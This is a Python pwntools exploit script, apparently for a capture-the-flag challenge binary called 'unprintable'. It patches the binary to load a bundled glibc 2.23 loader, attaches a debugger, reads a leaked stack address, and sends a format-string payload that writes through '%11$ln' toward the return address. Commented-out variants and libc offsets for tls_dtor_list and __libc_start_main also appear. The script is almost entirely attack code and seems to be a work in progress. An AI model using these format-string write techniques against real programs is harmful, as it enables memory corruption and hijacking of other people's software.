from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')

def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)

debug = 1
if debug == 1:
	elf = change_ld('./unprintable', './ld-2.23.so')
	p = elf.process(env={'LD_PRELOAD':'./libc-2.23.so'})

else:
	p = remote()


gdb.attach(p)
p.recvline()
stack_addr = int(p.recvline()[-15:-1], 16)
#print hex(stack_addr)
ebp_addr = stack_addr + 0x10
ret_addr = stack_addr + 0x18
log.info("ret_addr: " + hex(ret_addr))

#payload = "%*d%4$n"
'''
    0x7f6dabca39e0
tls_dtor_list        0x3C99E0
__libc_start_main+240    0x20740 + 240

'''
payload = "%12287d%11$ln"
#payload = "%*5$hhp"
#payload = "%p\n" * 0x20
p.send(payload)


p.interactive()
